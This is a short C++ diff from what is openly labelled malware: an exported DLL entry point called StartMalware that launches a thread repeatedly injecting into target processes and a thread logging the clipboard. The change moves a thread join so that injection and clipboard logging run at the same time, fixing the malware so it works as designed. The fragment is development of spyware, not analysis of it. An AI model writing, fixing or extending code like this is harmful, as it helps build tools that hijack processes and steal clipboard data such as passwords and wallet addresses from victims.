@@ -53,10 +53,11 @@ extern "C" __declspec(dllexport) void CALLBACK StartMalware(HWND hwnd, HINSTANCE
 
     Log("log.txt", "[+] loader: create inject thread.\n");
     std::thread threadInjectTargets(RepeatInjectTargets);
-    threadInjectTargets.join();
 
     Log("log.txt", "[+] loader: create clip board listener thread.\n");
     std::thread ClipBoardListener(ClipboardLogger);
+    
+    threadInjectTargets.join();
     ClipBoardListener.join();
 }
 
